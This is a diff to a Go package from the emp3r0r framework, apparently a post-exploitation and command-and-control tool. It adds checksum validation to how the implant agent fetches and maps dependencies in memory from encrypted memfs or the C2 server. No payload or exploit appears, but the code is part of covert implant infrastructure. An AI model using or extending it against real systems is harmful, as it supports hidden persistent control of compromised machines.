@@ -7,8 +7,10 @@
 // *memmod.Module: they run inside Use/Run, and the mapping is released when
 // the callback returns, on both success and failure (including panics).
 //
-// The raw dependency bytes still live in encrypted memfs and are re-fetched on
-// demand through the resolver wired by the agent (SetResolver).
+// The raw dependency bytes are resolved on every use through the resolver
+// wired by the agent (SetResolver). The resolver reuses a cached image only
+// when it matches the checksum supplied for that use, so a stale copy cannot
+// outlive a C2 update.
 package memdeps
 
 import (
@@ -19,15 +21,34 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
 )
 
+// Resolver fetches a named dependency's raw image. checksum is the SHA-256 of
+// the uncompressed image the caller expects, or "" when the caller does not
+// know it. A resolver may use it to reject a stale cache entry.
+type Resolver func(name, checksum string) ([]byte, error)
+
+// UseOption configures one Use call.
+type UseOption func(*useOptions)
+
+type useOptions struct {
+	checksum string
+}
+
+// WithChecksum supplies the expected SHA-256 of the dependency image. The
+// resolver uses it to validate a cached copy before mapping it; an empty
+// checksum means the caller does not have one.
+func WithChecksum(checksum string) UseOption {
+	return func(o *useOptions) { o.checksum = checksum }
+}
+
 var (
 	resolverMu sync.RWMutex
-	resolver   func(name string) ([]byte, error)
+	resolver   Resolver
 )
 
 // SetResolver wires the function that fetches a named dependency's raw bytes.
 // The agent points this at its memfs/C2 dependency fetcher. Passing nil
 // disables resolution (Use then fails).
-func SetResolver(fn func(name string) ([]byte, error)) {
+func SetResolver(fn Resolver) {
 	resolverMu.Lock()
 	defer resolverMu.Unlock()
 	resolver = fn
@@ -38,7 +59,7 @@ func SetResolver(fn func(name string) ([]byte, error)) {
 //
 // Any module obtained inside fn is only valid until fn returns; callers must
 // not retain it.
-func Use(name string, fn func(*memmod.Module) error) error {
+func Use(name string, fn func(*memmod.Module) error, opts ...UseOption) error {
 	if name == "" {
 		return errors.New("memdeps: empty dependency name")
 	}
@@ -48,7 +69,13 @@ func Use(name string, fn func(*memmod.Module) error) error {
 	if fetch == nil {
 		return errors.New("memdeps: no dependency resolver configured")
 	}
-	data, err := fetch(name)
+	var o useOptions
+	for _, opt := range opts {
+		if opt != nil {
+			opt(&o)
+		}
+	}
+	data, err := fetch(name, o.checksum)
 	if err != nil {
 		return fmt.Errorf("memdeps: resolve %s: %w", name, err)
 	}
